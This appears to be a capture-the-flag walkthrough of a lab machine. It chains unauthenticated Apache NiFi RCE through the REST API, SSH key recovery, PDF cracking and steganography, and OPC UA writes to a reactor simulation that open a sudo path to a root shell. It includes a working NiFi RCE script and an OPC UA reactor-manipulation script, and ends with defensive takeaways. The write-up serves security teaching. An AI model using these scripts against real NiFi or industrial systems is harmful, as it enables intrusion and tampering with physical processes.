Machine Overview

Helix presents a nearly invisible external attack surface — a fully static website with no dynamic endpoints. Subdomain discovery reveals an Apache NiFi 1.21.0 instance with anonymous access enabled, providing unauthenticated RCE via the ExecuteProcess processor API. Post-exploitation recovers an SSH private key from NiFi's support-bundles directory. As operator, a password-protected PDF and a steganographic PNG together reveal an OPC UA-based industrial reactor control architecture. Manipulating the reactor's OPC UA nodes triggers the safety controller to authorize a maintenance window — enabling a sudo-privileged script that spawns a root shell.

Apache NiFi — Unauthenticated RCE

03
ExecuteProcess Processor Exploit
NiFi RCE · Phase 03

The NiFi REST API allows creating ExecuteProcess processors that run arbitrary OS commands. The exploit flow: fetch the root process group ID → create an ExecuteProcess processor → configure command + arguments → set state to RUNNING. An HTTP callback to a Kali listener confirms RCE before deploying a reverse shell.

python3 — nifi_rce.py (core logic)
import sys, json, requests as req

class NiFiRCE:
    def __init__(self, url):
        self.url = url

    def get_root_group(self):
        r = req.get(self.url + "/nifi-api/process-groups/root", verify=False)
        return r.json()["id"]

    def create_processor(self, group_id):
        url = self.url + f"/nifi-api/process-groups/{group_id}/processors"
        data = {
            'component': {'type': 'org.apache.nifi.processors.standard.ExecuteProcess'},
            'revision': {'version': 0}
        }
        r = req.post(url, json=data, verify=False)
        return r.json()["id"]

    def run_cmd(self, proc_id, cmd):
        parts = cmd.split(" ", 1)
        data = {
            'component': {
                'id': proc_id, 'state': 'RUNNING',
                'config': {
                    'autoTerminatedRelationships': ['success'],
                    'schedulingPeriod': '3600 sec',
                    'properties': {
                        'Command': parts[0],
                        'Command Arguments': parts[1] if len(parts) > 1 else ''
                    }
                }
            },
            'revision': {'clientId': 'x', 'version': 1}
        }
        req.put(self.url + f"/nifi-api/processors/{proc_id}", json=data, verify=False)

    def exploit(self, cmd):
        gid = self.get_root_group()
        pid = self.create_processor(gid)
        self.run_cmd(pid, cmd)
        print(f"[+] Processor {pid} running: {cmd}")

ICS Analysis — PDF Cracking & PNG Steganography

06
Sudo Enumeration & Maintenance Window Logic
ICS Analysis · Phase 06

The operator account has a single sudo privilege: helix-maint-console. The script only grants a root shell if /opt/helix/state/maintenance_window exists with a future Unix timestamp. Operator cannot write to /opt/helix/state/ directly — the file must be created by another process.

bash
sudo -l
(root) NOPASSWD: /usr/local/sbin/helix-maint-console
bash — helix-maint-console key logic
FLAG="/opt/helix/state/maintenance_window"

window_ok() {
  [ -f "$FLAG" ] || return 1
  until_ts="$(cat "$FLAG")"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
}
# If window is open: spawns /bin/bash -p -i via systemd-run as root
# Operator cannot write to /opt/helix/state/ — file must come from safety controller
◈
The Puzzle: The helix-safety process (running as root) writes the maintenance_window file when hazardous reactor conditions are detected. The operator's home directory contains an Operator Guide PDF and a control diagram PNG that explain exactly how to trigger those conditions.

10
Trigger Maintenance Condition via OPC UA Writes
OPC UA · Phase 10

The safety controller monitors reactor variables and writes the maintenance_window file when hazardous test conditions are detected. Three writes are required: set Mode to MAINTENANCE, enable TestOverride, and raise CalibrationOffset to 11.0 — pushing the effective temperature reading to ~295°C (the maintenance threshold from the PDF).

python3 — reactor_trigger.py
from opcua import Client, ua
import time

client = Client("opc.tcp://127.0.0.1:4840/helix/")
client.connect()

mode          = client.get_node("ns=2;i=12")
test_override = client.get_node("ns=2;i=13")
cal_offset    = client.get_node("ns=2;i=6")
temp          = client.get_node("ns=2;i=4")
pressure      = client.get_node("ns=2;i=5")
trip          = client.get_node("ns=2;i=10")

# Step 1: Set MAINTENANCE mode
mode.set_data_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))

# Step 2: Enable TestOverride
test_override.set_data_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))

# Step 3: Raise CalibrationOffset to push temp to ~295°C
cal_offset.set_data_value(ua.DataValue(ua.Variant(11.0, ua.VariantType.Double)))

# Monitor until maintenance_window file appears
for i in range(60):
    t = temp.get_value()
    p = pressure.get_value()
    tr = trip.get_value()
    print(f"[{i:02d}] Temp={t:.2f}°C  Pressure={p:.2f} bar  TripActive={tr}")
    time.sleep(1)

client.disconnect()

key takeaways
// 01
NiFi Anonymous Access Is Unauthenticated RCE
Apache NiFi with supportsLogin: false allows any network-adjacent client to create and run ExecuteProcess processors, executing arbitrary OS commands as the NiFi service user. NiFi must always be deployed with authentication enabled and must never be directly accessible from untrusted networks.
// 02
Service Directories Must Not Store User Credentials
Storing an SSH private key backup in NiFi's support-bundles/ directory allowed full lateral movement once the nifi service account was compromised. Credentials must be managed by dedicated secrets managers and must never be stored in directories readable by service accounts.
// 03
Sensitive Documents Require Strong Password Protection
The PDF password operator1 was cracked in minutes against rockyou.txt. Operational documents containing system architecture, control logic, or access procedures must be protected with long, randomly generated passwords stored separately from the documents themselves.
// 04
Steganography Is Not a Security Control
Embedding an OPC UA node map in a PNG image provides no meaningful security — binwalk extracts embedded files trivially. Sensitive architectural information must be protected by access controls and encryption, not by obscuring it in image data.
// 05
OPC UA Industrial Interfaces Require Authentication
The OPC UA server accepted anonymous connections with full write access to reactor control nodes. Industrial OPC UA deployments must enforce certificate-based or username/password authentication, apply read/write ACLs per node, and log all write operations for audit purposes.
// 06
File-Based Privilege Gates Require Integrity Protection
The helix-maint-console script relies on the existence and content of a file as its sole authorization check. Without cryptographic signing or additional integrity verification, any process that can write to that path controls root access. Privileged maintenance gates should require multi-factor authorization and cryptographically verified authorization tokens.
